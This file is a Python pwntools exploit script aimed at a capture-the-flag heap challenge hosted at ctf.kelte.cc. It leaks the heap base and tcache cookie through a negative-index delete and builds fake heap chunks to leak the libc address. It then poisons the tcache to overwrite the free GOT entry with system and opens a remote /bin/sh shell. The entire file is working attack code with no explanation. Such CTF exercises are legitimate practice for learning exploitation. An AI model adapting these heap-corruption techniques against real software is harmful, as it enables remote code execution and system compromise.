#!/usr/bin/env python3

from pwn import remote, ELF, p64, u64


def add_user(io, name, line = True):
    io.sendlineafter(b'> ', b'1')

    if line:
        io.sendlineafter(b': ', name)
    else:
        io.sendline(b': ', name)


def delete_user(io, index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(index).encode())


def print_users(io):
    io.sendlineafter(b'> ', b'3')


def exit(io):
    io.sendlineafter(b'> ', b'4')


def main():
    io = remote('ctf.kelte.cc', 17172)
    libc = ELF('./libc.so.6')

    try:
        add_user(io, p64(0x201) * 8)
        add_user(io, b'B' * 8 * 4)

        delete_user(io, -100)

        print_users(io)
        io.readline()
        line = io.readline()

        leak = u64(line[8:16]) << (4 * 3)
        heap_base = leak - 0x14000
        print(f'heap_base @ 0x{heap_base:x}')

        tcache_cookie = u64(line[16:24])
        print(f'tcache_cookie @ 0x{tcache_cookie:x}')

        for _ in range(7):
            add_user(io, b'A' * 32)

        for _ in range(7):
            delete_user(io, 1)

        payload = (
            b'_' * 0x10 + 
            (p64(0x500) + p64(0x1001)) * 7 +
            p64(0) + p64(0x501) + 
            p64(0x41) * 12 + 
            p64(0x21) * 0x20
        )

        add_user(io, payload)
        delete_user(io, 0)

        print_users(io)
        io.readline()
        line = io.readline()

        leak = u64(line[144:152])
        libc_base = leak - 0x1f6cc0
        print(f'libc_base @ 0x{libc_base:x}')

        add_user(io, b'A' * 32)

        add_user(io, b'A' * 0x3d)
        add_user(io, b'A' * 0x3d)

        delete_user(io, 2)
        delete_user(io, 2)

        add_user(io, b'A' * 32 + b'B' * 32 + b'C' * 32 + b'D' * 32)
        add_user(io, b'E' * 32 + b'F' * 32 + b'G' * 32 + b'H' * 32)

        delete_user(io, 2)
        delete_user(io, 2)
        delete_user(io, 0)

        libcpp_base = libc_base + 0x225000
        print(f'libcpp_base @ 0x{libcpp_base:x}')

        location = heap_base + 0x140c0
        target = libcpp_base + 0x224c20  # free@got[plt]

        ptr = target ^ (location >> 12)

        payload = (
            p64(0x21) * (352 // 8) + 
            p64(0) + p64(0x91) +
            p64(ptr) + p64(tcache_cookie)
        )

        payload += p64(0x21) * ((0x1f0 - len(payload)) // 8)

        add_user(io, payload)

        system = libc_base + libc.symbols['system'] - 1

        add_user(io, b'A' * 0x80)
        add_user(io, b'/bin/sh\x00' + p64(system) * 0x0f)

        io.interactive()
    finally:
        io.close()


if __name__ == '__main__':
    main()
